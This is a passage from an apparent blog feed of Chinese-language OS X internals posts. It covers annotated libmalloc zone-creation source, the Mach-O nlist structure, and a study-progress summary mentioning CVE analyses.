class="comment">// The magazines are indexed in [0 .. (num_tiny_magazines - 1)]</span></span><br><span class="line">	<span class="comment">// Find the smallest power of 2 that exceeds (num_tiny_magazines - 1)</span></span><br><span class="line">	<span class="comment">// 通过计算获取num_tiny_magazines_mask_shift的值</span></span><br><span class="line">	<span class="comment">// num_tiny_magazines_mask_shift = log2(szone-&gt;num_tiny_magazines-1)</span></span><br><span class="line">	szone-&gt;num_tiny_magazines_mask_shift = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>( i &lt;= (szone-&gt;num_tiny_magazines - <span class="number">1</span>) ) &#123;</span><br><span class="line">		szone-&gt;num_tiny_magazines_mask_shift++;</span><br><span class="line">		i &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now if i &lt;= TINY_MAX_MAGAZINES we'll never access tiny_magazines[] out of bounds.</span></span><br><span class="line">	<span class="keyword">if</span> (i &gt; TINY_MAX_MAGAZINES) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - magazine mask exceeds allocated magazines.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reduce i by 1 to obtain a mask covering [0 .. (num_tiny_magazines - 1)]</span></span><br><span class="line">	szone-&gt;num_tiny_magazines_mask = i - <span class="number">1</span>; <span class="comment">// A mask used for hashing to a magazine index (and a safety aid)</span></span><br><span class="line">	szone-&gt;last_tiny_advise = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Init the tiny_magazine locks</span></span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;tiny_regions_lock);</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;tiny_magazines[DEPOT_MAGAZINE_INDEX].magazine_lock);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; szone-&gt;num_tiny_magazines; ++i) &#123;</span><br><span class="line">		_malloc_lock_init(&amp;szone-&gt;tiny_magazines[i].magazine_lock);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个tiny的内存空间，并初始化相关数据--------end</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个small的内存空间，并初始化相关数据--------start</span></span><br><span class="line">	szone-&gt;num_small_magazines = (nproc &gt; <span class="number">1</span>) ? MIN(nproc, SMALL_MAX_MAGAZINES) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIXME vm_allocate() based on number of configured CPUs</span></span><br><span class="line">	<span class="keyword">magazine_t</span> *small_magazines = allocate_pages(<span class="literal">NULL</span>, SMALL_MAGAZINE_PAGED_SIZE, <span class="number">0</span>,</span><br><span class="line">												 SCALABLE_MALLOC_ADD_GUARD_PAGES, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == small_magazines)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	szone-&gt;small_magazines = &amp;(small_magazines[<span class="number">1</span>]); <span class="comment">// szone-&gt;small_magazines[-1] is the Depot</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The magazines are indexed in [0 .. (num_small_magazines - 1)]</span></span><br><span class="line">	<span class="comment">// Find the smallest power of 2 that exceeds (num_small_magazines - 1)</span></span><br><span class="line">	szone-&gt;num_small_magazines_mask_shift = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>( i &lt;= (szone-&gt;num_small_magazines - <span class="number">1</span>) ) &#123;</span><br><span class="line">		szone-&gt;num_small_magazines_mask_shift++;</span><br><span class="line">		i &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now if i &lt;= SMALL_MAX_MAGAZINES we'll never access small_magazines[] out of bounds.</span></span><br><span class="line">	<span class="keyword">if</span> (i &gt; SMALL_MAX_MAGAZINES) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - magazine mask exceeds allocated magazines.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reduce i by 1 to obtain a mask covering [0 .. (num_small_magazines - 1)]</span></span><br><span class="line">	szone-&gt;num_small_magazines_mask = i - <span class="number">1</span>; <span class="comment">// A mask used for hashing to a magazine index (and a safety aid)</span></span><br><span class="line">	szone-&gt;last_small_advise = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Init the small_magazine locks</span></span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;small_regions_lock);</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;small_magazines[DEPOT_MAGAZINE_INDEX].magazine_lock);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; szone-&gt;num_small_magazines; ++i) &#123;</span><br><span class="line">		_malloc_lock_init(&amp;szone-&gt;small_magazines[i].magazine_lock);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CHECK(szone, __PRETTY_FUNCTION__);</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个small的内存空间，并初始化相关数据--------end</span></span><br><span class="line">	<span class="comment">//逻辑与tiny相同，只是变量不同</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)szone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="create_nano_zone">create_nano_zone</h3><p>对<code>nano_zone</code>的创建就相对简单很多，这里不多做分析，直接看注释的源码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((visibility(<span class="string">"hidden"</span>)))</span><br><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">create_nano_zone(<span class="keyword">size_t</span> initial_size, <span class="keyword">malloc_zone_t</span> *helper_zone, <span class="keyword">unsigned</span> debug_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">nanozone_t</span>	*nanozone;</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!_malloc_engaged_nano) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//检测comm page的版本</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__x86_64__)</span></span><br><span class="line">	<span class="keyword">if</span> (_COMM_PAGE_VERSION_REQD &gt; (*((<span class="keyword">uint16_t</span> *)_COMM_PAGE_VERSION))) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - comm page version mismatch.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* get memory for the zone. */</span></span><br><span class="line">	<span class="comment">//申请nanozone数据结构大小的内存</span></span><br><span class="line">	nanozone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (!nanozone)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the basic_zone portion of the nanozone structure */</span></span><br><span class="line">	<span class="comment">//设置外部调用函数</span></span><br><span class="line">	nanozone-&gt;basic_zone.version = <span class="number">8</span>;</span><br><span class="line">	nanozone-&gt;basic_zone.size = (<span class="keyword">void</span> *)nano_size;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">malloc</span> = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ? (<span class="keyword">void</span> *)nano_malloc_scribble : (<span class="keyword">void</span> *)nano_malloc;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">calloc</span> = (<span class="keyword">void</span> *)nano_calloc;</span><br><span class="line">	nanozone-&gt;basic_zone.valloc = (<span class="keyword">void</span> *)nano_valloc;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">free</span> = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ? (<span class="keyword">void</span> *)nano_free_scribble : (<span class="keyword">void</span> *)nano_free;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">realloc</span> = (<span class="keyword">void</span> *)nano_realloc;</span><br><span class="line">	nanozone-&gt;basic_zone.destroy = (<span class="keyword">void</span> *)nano_destroy;</span><br><span class="line">	nanozone-&gt;basic_zone.batch_malloc = (<span class="keyword">void</span> *)nano_batch_malloc;</span><br><span class="line">	nanozone-&gt;basic_zone.batch_free = (<span class="keyword">void</span> *)nano_batch_free;</span><br><span class="line">	nanozone-&gt;basic_zone.introspect = (<span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span> *)&amp;nano_introspect;</span><br><span class="line">	nanozone-&gt;basic_zone.memalign = (<span class="keyword">void</span> *)nano_memalign;</span><br><span class="line">	nanozone-&gt;basic_zone.free_definite_size = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ?</span><br><span class="line">	(<span class="keyword">void</span> *)nano_free_definite_size_scribble : (<span class="keyword">void</span> *)nano_free_definite_size;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;basic_zone.pressure_relief = (<span class="keyword">void</span> *)nano_pressure_relief;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;basic_zone.reserved1 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	nanozone-&gt;basic_zone.reserved2 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	</span><br><span class="line">	mprotect(nanozone, <span class="keyword">sizeof</span>(nanozone-&gt;basic_zone), PROT_READ); <span class="comment">/* Prevent overwriting the function pointers in basic_zone. */</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* set up the remainder of the nanozone structure */</span></span><br><span class="line">	nanozone-&gt;debug_flags = debug_flags;</span><br><span class="line">	nanozone-&gt;our_signature = NANOZONE_SIGNATURE;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Query the number of configured processors. */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__x86_64__)</span></span><br><span class="line">	nanozone-&gt;phys_ncpus = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_PHYSICAL_CPUS;</span><br><span class="line">	nanozone-&gt;logical_ncpus = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_LOGICAL_CPUS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">error</span> Unknown architecture</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//根据cpu的不同，对meta_data进行初始化</span></span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;phys_ncpus &gt; <span class="keyword">sizeof</span>(nanozone-&gt;core_mapped_size)/<span class="keyword">sizeof</span>(nanozone-&gt;core_mapped_size[<span class="number">0</span>])) &#123;</span><br><span class="line">		_malloc_printf(ASL_LEVEL_NOTICE, <span class="string">"nano zone abandoned because NCPUS mismatch.\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != (nanozone-&gt;logical_ncpus % nanozone-&gt;phys_ncpus)) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - logical_ncpus % phys_ncpus != 0.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span> (nanozone-&gt;logical_ncpus/nanozone-&gt;phys_ncpus) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			malloc_printf(<span class="string">"*** FATAL ERROR - logical_ncpus / phys_ncpus not 1, 2, or 4.\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Initialize slot queue heads and resupply locks. */</span></span><br><span class="line">	<span class="comment">//#define	OS_ATOMIC_QUEUE_INIT	&#123; NULL, 0 &#125;</span></span><br><span class="line">	OSQueueHead q0 = OS_ATOMIC_QUEUE_INIT; <span class="comment">//&#123;NULL,0&#125;</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nanozone-&gt;phys_ncpus; ++i) &#123;</span><br><span class="line">        _malloc_lock_init(&amp;nanozone-&gt;band_resupply_lock[i]);</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; NANO_SLOT_SIZE; ++j) &#123;</span><br><span class="line">			nanozone-&gt;meta_data[i][j].slot_LIFO = q0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//对地址随机化做处理。</span></span><br><span class="line">	<span class="comment">/* Initialize the security token. */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == _dyld_get_image_slide((<span class="keyword">const</span> <span class="keyword">struct</span> mach_header*)_NSGetMachExecuteHeader())) &#123;</span><br><span class="line">		<span class="comment">// zero slide when ASLR has been disabled by boot-arg. Eliminate cloaking.</span></span><br><span class="line">		malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nanozone-&gt;cookie = (<span class="keyword">uintptr_t</span>)malloc_entropy[<span class="number">0</span>] &amp; <span class="number">0x0000ffffffff0000</span>ULL; <span class="comment">// scramble central 32bits with this cookie</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Nano zone does not support SCALABLE_MALLOC_ADD_GUARD_PAGES. */</span></span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;debug_flags &amp; SCALABLE_MALLOC_ADD_GUARD_PAGES) &#123;</span><br><span class="line">		_malloc_printf(ASL_LEVEL_INFO, <span class="string">"nano zone does not support guard pages\n"</span>);</span><br><span class="line">		nanozone-&gt;debug_flags &amp;= ~SCALABLE_MALLOC_ADD_GUARD_PAGES;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;helper_zone = helper_zone;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)nanozone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="小结">小结</h1><p>至此，<code>nano_zone</code>和<code>scalable_zone</code>的数据结构组成，以及其数据初始化之后的分布，已经大致的分析完成了，下一篇文章，将通过对<code>nano_malloc</code>以及<code>nano_free</code>的简单分析，来理解<code>nano_zone</code>的使用情况。</p>
<h1 id="reference">reference</h1><p>1.iOS内存管理和malloc源码解读</p>
<p><a href="https://yq.aliyun.com/articles/3065" target="_blank" rel="external">https://yq.aliyun.com/articles/3065</a></p>
<p>2.OS X heap exploitation techniques</p>
<p><a href="http://phrack.org/issues/63/5.html#article" target="_blank" rel="external">http://phrack.org/issues/63/5.html#article</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="摘要">摘要</h1><p>为了加深对<code>OS X</code>系统在应用层堆内存分配的了解，对<code>libmalloc</code>进行了阅读与理解。</p>
<ul>
<li>加强对堆上内存分布的理解</li>
<li>遇到内存泄露问题需要处理时，对堆分配策略的了解，可以提高分析的速度与精确度</li>
<li>遇到堆内存漏洞利用时，可以更加清楚的理解<code>EXP</code>的原理，做出更精准的分析</li>
</ul>
<p>阅读本文之前可以先稍微了解一下<code>OS X</code>在堆上的内存处理的大致情况，点<a href="https://yq.aliyun.com/articles/3065">这里</a>。了解大致情况之后，才能更好的理解源码的设计。</p>]]>
    
    </summary>
    
      <category term="malloc" scheme="http://turingh.github.io/tags/malloc/"/>
    
      <category term="基本功要扎实" scheme="http://turingh.github.io/tags/%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%A6%81%E6%89%8E%E5%AE%9E/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[nlist-Mach-O文件重定向信息数据结构分析]]></title>
    <link href="http://turingh.github.io/2016/05/24/nlist-Mach-O%E6%96%87%E4%BB%B6%E9%87%8D%E5%AE%9A%E5%90%91%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/05/24/nlist-Mach-O文件重定向信息数据结构分析/</id>
    <published>2016-05-25T03:30:50.000Z</published>
    <updated>2016-05-25T03:59:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在研究<code>Mach-O</code>的重定向相关内容时，就一定会遇到nlist这个数据结构，他定义在<mach-o nlist.h="">文件中，简单的对头文件中的注释做了翻译和整理，体现在图上面，nlist的数据结构看似非常简单，使用的时候却有点复杂，理解nlist的数据结构是进一步对OSX内核进行分析非常重要的一步。</mach-o></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/nlist/nlist%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.png" alt="nlist分析图"></p>
<a id="more"></a>
<h1 id="0x01_简单介绍">0x01 简单介绍</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> nlist &#123;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span> __LP64__</span></span><br><span class="line">		<span class="keyword">char</span> *n_name;	<span class="comment">/* for use when in-core */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">uint32_t</span> n_strx;	<span class="comment">/* index into the string table */</span></span><br><span class="line">	&#125; n_un;</span><br><span class="line">	<span class="keyword">uint8_t</span> n_type;		<span class="comment">/* type flag, see below */</span></span><br><span class="line">	<span class="keyword">uint8_t</span> n_sect;		<span class="comment">/* section number or NO_SECT */</span></span><br><span class="line">	<span class="keyword">int16_t</span> n_desc;		<span class="comment">/* see &lt;mach-o/stab.h&gt; */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> n_value;	<span class="comment">/* value of this symbol (or stab offset) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * This is the symbol table entry structure for 64-bit architectures.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> nlist_64 &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span>  n_strx; <span class="comment">/* index into the string table */</span></span><br><span class="line">    &#125; n_un;</span><br><span class="line">    <span class="keyword">uint8_t</span> n_type;        <span class="comment">/* type flag, see below */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> n_sect;        <span class="comment">/* section number or NO_SECT */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> n_desc;       <span class="comment">/* see &lt;mach-o/stab.h&gt; */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> n_value;      <span class="comment">/* value of this symbol (or stab offset) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-1_n_type">1.1 n_type</h2><p>​    <code>n_type</code>拥有8个bit，他的分配如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * The n_type field really contains four fields:</span><br><span class="line"> *	unsigned char N_STAB:3,</span><br><span class="line"> *		      N_PEXT:1,</span><br><span class="line"> *		      N_TYPE:3,</span><br><span class="line"> *		      N_EXT:1;</span><br><span class="line"> * which are used via the following masks.</span><br><span class="line"> */</span></span><br></pre></td></tr></table></figure>
<p>而<code>N_TYPE</code>又分出好多种，具体的定义可以参见上面的思维导图，或者源码中的注释。</p>
<p><code>n_type</code>字段主要用来标识重定义符号不同的种类。</p>
<h2 id="1-2_n_desc">1.2 n_desc</h2><p>​    <code>n_desc</code>的用法与<code>n_type</code>类似，也是被掩码切分成好多块，分别表示不同的含义。用来标识重定义符一些特性。</p>
<h2 id="1-3_n_value">1.3 n_value</h2><p>​    <code>n_value</code>值的具体意义根据<code>n_type</code>、<code>n_sect</code>的变化，而拥有各自不同的含义。</p>
<h1 id="0x02_小结">0x02 小结</h1><p>其实<mach-o nlist.h="">中的注释已经解释的非常清楚了，在阅读本文之后，结合思维导图阅读源码文件，不仅可以减少理解的时间，而且可以更加系统的去理解nlist数据结构，或者有目的性的阅读与当前需求相关的部分。</mach-o></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在研究<code>Mach-O</code>的重定向相关内容时，就一定会遇到nlist这个数据结构，他定义在<mach-o/nlist.h>文件中，简单的对头文件中的注释做了翻译和整理，体现在图上面，nlist的数据结构看似非常简单，使用的时候却有点复杂，理解nlist的数据结构是进一步对OSX内核进行分析非常重要的一步。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/nlist/nlist%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.png" alt="nlist分析图"></p>]]>
    
    </summary>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[10-11-4版本小结]]></title>
    <link href="http://turingh.github.io/2016/05/23/10-11-4%E7%89%88%E6%9C%AC%E5%B0%8F%E7%BB%93/"/>
    <id>http://turingh.github.io/2016/05/23/10-11-4版本小结/</id>
    <published>2016-05-23T18:21:22.000Z</published>
    <updated>2016-05-23T18:56:05.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</code>版本的补丁中还有大量的漏洞没有研究完，又放出了新的版本，这里稍微做一下总结。</p>
<h1 id="0x01_10-11-4_小结">0x01 10.11.4 小结</h1><h2 id="1-1_基础知识">1.1 基础知识</h2><h3 id="1-1-1_macho格式学习">1.1.1 macho格式学习</h3><p>​    因为刚开始研究<code>OS X</code>系统，花了一部分时间研究了mach-o文件格式的知识，在后续的漏洞分析中发现，mach-o文件的知识还不够扎实，还会有很多似懂非懂的问题。</p>
<p><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o格式分析</a></p>
<p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">Mach-O的动态链接相关知识</a></p>
<p><a href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">fishhook源码分析</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSX内核加载mach-o流程分析</a></p>
<h3 id="1-1-2_dyld源码分析">1.1.2 dyld源码分析</h3><p><a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">dyld源码分析-动态加载load</a></p>
<p><a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">dyld中mach-o文件加载的简单分析</a></p>
<h2 id="1-2漏洞分析">1.2漏洞分析</h2><p>​    主要分析了两个漏洞<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>以及<a href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/">CVE-2016-1749</a>。两个漏洞一个是应用层一个是内核层的，在分析研究漏洞的过程中，也熟悉掌握了ida，bindiff，lldb等一系列工具的实际操作。在分析另外一个内核漏洞的过程中，发现在内核框架的掌握上有比较大的缺憾，所以花了大量的时间熟悉了内核开发与一些相关部分的源码，所以有半个月时间左右没有通过日志总结学习的小结，在<code>10.11.5</code>版本的漏洞研究时将补充相关的内容。</p>
<ul>
<li>libkern c++ 运行时源码学习</li>
<li>kext内核扩展加载流程</li>
<li>iokit框架工作的原理及细节的简单深入分析</li>
<li>mach-o的dyld中重定向的代码细节</li>
</ul>
<h1 id="0x02_10-11-5_目标">0x02 10.11.5 目标</h1><ul>
<li>提高漏洞分析的能力和速度（POC构建，EXP编写）</li>
<li>提高基础能力的学习（内核源码，系统结构）</li>
</ul>
]]></content>
    <summary type="html">
